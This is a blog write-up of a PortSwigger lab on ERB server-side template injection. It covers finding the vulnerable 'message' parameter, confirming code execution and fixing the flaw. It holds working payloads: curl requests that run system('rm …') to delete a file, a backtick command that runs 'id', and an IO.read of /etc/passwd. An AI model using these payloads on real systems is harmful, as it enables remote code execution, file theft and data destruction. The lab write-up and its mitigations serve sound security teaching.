---
layout: post
title: "PortSwigger: Basic server-side template injection"
date: 2027-11-05 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, SSTI]
tags: [portswigger, ssti, template-injection, erb, ruby, rce, cwe-1336, cwe-94]
---

A shopping site shows "Unfortunately this product is out of stock" when you view an out-of-stock item. That message is pushed back to you through a URL parameter — and the server renders it as **ERB (Embedded Ruby)** template code instead of treating it as plain text. So whatever Ruby you write in that parameter, the server runs. This is **server-side template injection** ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) / [CWE-94](https://cwe.mitre.org/data/definitions/94.html)), and it goes straight to remote code execution.

## Overview

The goal is to delete the file `/home/carlos/morale.txt` on the server. To do that we need to run an OS command — so we need code execution, not just a printed string.

A *template* is an HTML skeleton with placeholders the app fills with data, e.g. `Hello <%= name %>`. The bug appears when user input is baked into the template **source** rather than passed in as a **value**. The engine then evaluates the input as code.

## Finding the injection point

The injection point isn't an obvious form field. Click an out-of-stock product:

```
GET /product?productId=1
```

The server replies with a redirect:

```
HTTP/1.1 302 Found
Location: /?message=Unfortunately this product is out of stock
```

That `message` query parameter is rendered through the ERB template — so **`message` is the sink.**

## Confirming code execution

ERB's `<%= ... %>` tag means "evaluate this Ruby and print the result." Send a math expression and see whether the page prints the *answer*:

```bash
curl -s -G "https://YOUR-LAB-ID.web-security-academy.net/" \
  --data-urlencode 'message=<%= 7*7 %>'
```

The response contains:

```html
<div>49
```

`49`, not `7*7` — the server evaluated Ruby. SSTI confirmed.

## Exploiting it

Ruby's `Kernel#system` runs an operating-system command. Drop the deletion into the `<%= %>` tag:

```bash
curl -s -G "https://YOUR-LAB-ID.web-security-academy.net/" \
  --data-urlencode 'message=<%= system("rm /home/carlos/morale.txt") %>'
```

The response contains:

```html
<div>true
```

`true` is what Ruby's `system()` returns when the command succeeds — `morale.txt` is deleted and the lab flips to **Solved**.

Equivalent RCE forms once you have an ERB sink:

- `<%= `id` %>` — backticks run a command and print its output
- `<%= IO.read('/etc/passwd') %>` — read an arbitrary server-side file

## Why it worked

The application concatenated attacker input into the template **source** and then asked ERB to compile and evaluate it. ERB has no sandbox: `<%= %>` literally means "run this Ruby." So the input executed with the full power of the app's user account, rather than being shown as inert text. Unlike Jinja2 or Velocity SSTI — which need long "gadget" chains to reach `os`/`Runtime` — ERB evaluates raw Ruby directly, so a single `system(...)` call is enough.

## Mitigation

- **Never render user input as a template.** Pass it only as bound data into a fixed, precompiled template: `erb :page, locals: { message: params[:message] }`. The value is displayed, never evaluated.
- Prefer a **logic-less engine** (Mustache, Liquid) where user-supplied templates simply cannot contain executable code.
- If user-authored templates are genuinely required, compile them in a **sandbox** and render under a **low-privilege account**.
- Validate / allow-list the `message` value against a known set of expected strings.
